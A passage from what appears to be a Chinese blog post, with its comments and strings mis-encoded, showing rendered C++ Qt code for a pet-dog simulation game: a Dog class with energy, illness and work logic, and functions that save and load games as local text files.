class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;dog.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;family.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QMessageBox&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QInputDialog&gt;</span></span><br><br><br>Dog::<span class="hljs-built_in">Dog</span>()<br>&#123;<br>    ill=<span class="hljs-number">0</span>;<br>    ability=<span class="hljs-number">0</span>;<br>    energy=<span class="hljs-number">10</span>;<br>    state=<span class="hljs-number">0</span>;<br>    worktime=<span class="hljs-number">0</span>;<br>&#125;<br><br>Dog::~<span class="hljs-built_in">Dog</span>() &#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::DogGrow</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(ill==<span class="hljs-number">1</span>||energy&lt;=<span class="hljs-number">0.0</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">//å¦‚æœå°ç‹—ç”Ÿç—…äº†ï¼Œå°±ç›´æ¥é€€å›ä¸ä¼šå‘ç”Ÿç»å†çš„çš„æ¶ˆè€—</span><br><br>    <span class="hljs-keyword">if</span>(state==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(energy<span class="hljs-number">-1</span>&lt;=<span class="hljs-number">0.0</span>)<br>        &#123;<br>            energy=<span class="hljs-number">0.0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            energy--;  <span class="hljs-comment">//æ—¥å¸¸æ´»åŠ¨é»˜è®¤ç²¾åŠ›å‡ä¸€</span><br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        state=<span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogName</span><span class="hljs-params">(QString Dogname)</span></span><br><span class="hljs-function"></span>&#123;<br>    name=Dogname;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogEnergy</span><span class="hljs-params">(<span class="hljs-type">double</span> Dogenergy)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy=Dogenergy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogAbility</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogability)</span></span><br><span class="hljs-function"></span>&#123;<br>    ability=Dogability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::resetDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=<span class="hljs-number">0</span>;<br>    ill=<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogIll</span><span class="hljs-params">(<span class="hljs-type">int</span> DogIll)</span></span><br><span class="hljs-function"></span>&#123;<br>    ill=DogIll;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogState</span><span class="hljs-params">(<span class="hljs-type">int</span> Dogstate)</span></span><br><span class="hljs-function"></span>&#123;<br>    state=Dogstate;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::setDogWorktime</span><span class="hljs-params">(<span class="hljs-type">int</span> Worktime)</span></span><br><span class="hljs-function"></span>&#123;<br>    worktime=Worktime;<br>&#125;<br><br><span class="hljs-function">QString <span class="hljs-title">Dog::getDogName</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> name;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">double</span> <span class="hljs-title">Dog::getDogEnergy</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> energy;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogAbility</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ability;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> ill;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogState</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dog::getDogWorktime</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> worktime;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::judgeDogIll</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(energy==<span class="hljs-number">0.0</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(worktime==<span class="hljs-number">5</span>)<br>    &#123;<br>        ill=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Dog::doHousework</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">2</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;åšå®¶åŠ¡&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¸®å¿™å®¶åŠ¡ä¸€å°æ—¶ï¼Œå¿«å¤¸å¤¸å°ç‹—ï¼\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;åšå®¶åŠ¡&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¾ˆç´¯ï¼Œå¿«ä¸ºå°ç‹—è¡¥å……ä½“åŠ›å§ï¼\n&quot;</span>);<br>    &#125;<br>&#125;<br><br>BigDog::<span class="hljs-built_in">BigDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += (food / <span class="hljs-number">2.0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BigDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy -= (<span class="hljs-number">1</span> / <span class="hljs-number">2.0</span>);<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å°†å‡ºé—¨æ‰“å·¥ä¸€å°æ—¶ï¼Œè®°å¾—å¥–åŠ±å°ç‹—å“¦ï¼\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¾ˆç´¯ï¼Œå¿«ä¸ºå°ç‹—è¡¥å……ä½“åŠ›å§ï¼\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;ç»éªŒä¸è¶³è¢«è€æ¿åŠé€€äº†ï¼Œå»åšå®¶åŠ¡å¢åŠ ç»éªŒå§ï¼\n&quot;</span>);<br>        &#125;<br><br>    &#125;<br><br>&#125;<br><br>SmallDog::<span class="hljs-built_in">SmallDog</span>()&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::eat</span><span class="hljs-params">(<span class="hljs-type">int</span> food)</span></span><br><span class="hljs-function"></span>&#123;<br>    energy += food;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SmallDog::doWork</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    QString message=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (energy &gt;= <span class="hljs-number">3.0</span> &amp;&amp; ability &gt;= <span class="hljs-number">5</span>)<br>    &#123;<br>        energy --;<br>        ability ++;<br>        worktime ++;<br>        QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å°†å‡ºé—¨æ‰“å·¥ä¸€å°æ—¶ï¼Œè®°å¾—å¥–åŠ±å°ç‹—å“¦ï¼\n&quot;</span>);<br>        state=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (energy &lt; <span class="hljs-number">3.0</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;å°ç‹—å¾ˆç´¯ï¼Œå¿«ä¸ºå°ç‹—è¡¥å……ä½“åŠ›å§ï¼\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ability &lt; <span class="hljs-number">5</span>)<br>        &#123;<br>            QMessageBox::<span class="hljs-built_in">warning</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-string">&quot;æ‰“å·¥&quot;</span>, <span class="hljs-string">&quot;ç»éªŒä¸è¶³è¢«è€æ¿åŠé€€äº†ï¼Œå»åšå®¶åŠ¡å¢åŠ ç»éªŒå§ï¼\n&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-2-éƒ¨åˆ†åŠŸèƒ½ä»‹ç»"><a href="#5-2-éƒ¨åˆ†åŠŸèƒ½ä»‹ç»" class="headerlink" title="5.2 éƒ¨åˆ†åŠŸèƒ½ä»‹ç»"></a>5.2 éƒ¨åˆ†åŠŸèƒ½ä»‹ç»</h4><h5 id="è¯»æ¡£å­˜æ¡£"><a href="#è¯»æ¡£å­˜æ¡£" class="headerlink" title="è¯»æ¡£å­˜æ¡£"></a>è¯»æ¡£å­˜æ¡£</h5><p>åˆ©ç”¨TXTæ–‡ä»¶çš„è¯»å†™å®ç°å­˜æ¡£åŠŸèƒ½</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-comment">//-------------------------è¯»æ¡£å­˜æ¡£ç•Œé¢-----------------------------</span><br><span class="hljs-comment">//åˆå§‹è½½å…¥å­˜æ¡£åç§°</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::InitialRecord</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function">QFile <span class="hljs-title">Fread</span><span class="hljs-params">(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);    <span class="hljs-comment">//save1æ˜¯å›¾å½¢åŒ–ç•Œé¢ä¸­ç»„ä»¶çš„åå­—ï¼Œä¸‹åŒ</span><br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            ui-&gt;save1-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read1-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save2-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read2-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save3-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read3-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>    Fread.<span class="hljs-built_in">setFileName</span>(<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save4.txt&quot;</span>);<br>    isExist=Fread.<span class="hljs-built_in">open</span>(QIODevice::ReadOnly);<br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fread)</span></span>;<br>        QString s;<br>        ds &gt;&gt; s;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(s.<span class="hljs-built_in">toUtf8</span>().<span class="hljs-built_in">data</span>(),<span class="hljs-string">&quot;!@#$%^&quot;</span>)==<span class="hljs-number">0</span>)&#123;<br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br><br>            ui-&gt;save4-&gt;<span class="hljs-built_in">setText</span>(s);<br>            ui-&gt;read4-&gt;<span class="hljs-built_in">setText</span>(s);<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//é‡ç½®å­˜æ¡£</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ResetRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save3.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save3;<br>        pRead=ui-&gt;read3;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;.../PuppiesMakeAHome/database/Save4.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save4;<br>        pRead=ui-&gt;read4;<br>    &#125;<br><br><br>    <span class="hljs-function">QFile <span class="hljs-title">Fwrite</span><span class="hljs-params">(recordPath)</span></span>;<br>    <span class="hljs-type">bool</span> isExist=Fwrite.<span class="hljs-built_in">open</span>(QIODevice::WriteOnly);  <span class="hljs-comment">//å¯¹å­˜æ¡£æ–‡ä»¶è¿›è¡Œåªå†™æ“ä½œå†™å…¥ç©ºå­˜æ¡£æ ‡å¿— !@#$%^</span><br>    <span class="hljs-keyword">if</span>(isExist)&#123;<br>        <span class="hljs-function">QDataStream <span class="hljs-title">ds</span><span class="hljs-params">(&amp;Fwrite)</span></span>;<br>        QString s=<span class="hljs-string">&quot;!@#$%^&quot;</span>;<br>        ds &lt;&lt; <span class="hljs-built_in">QString</span>(s);<br>    &#125;<br><br>    pSave-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br>    pRead-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;æ–°å»ºå®¶åº­&quot;</span>);<br><br>    Fwrite.<span class="hljs-built_in">close</span>();<br><br>&#125;<br><br><span class="hljs-comment">//è¯»æ¡£</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::ReadRecord</span><span class="hljs-params">(QString recordPath)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret=QMessageBox::<span class="hljs-built_in">question</span>(<span class="hljs-keyword">this</span>,<span class="hljs-string">&quot;æç¤º&quot;</span>,<span class="hljs-string">&quot;&lt;h3&gt;ç¡®å®šé€‰æ‹©è¯¥å­˜æ¡£?&lt;/h3&gt;&quot;</span>);<br>    <span class="hljs-keyword">if</span>(ret==QMessageBox::No) <span class="hljs-keyword">return</span>;<br><br><br>    QPushButton* pSave=ui-&gt;save1,*pRead=ui-&gt;read1;<br>    <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save1.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save1;<br>        pRead=ui-&gt;read1;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span class="hljs-string">&quot;../PuppiesMakeAHome/database/Save2.txt&quot;</span>)&#123;<br>        pSave=ui-&gt;save2;<br>        pRead=ui-&gt;read2;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(recordPath==<span 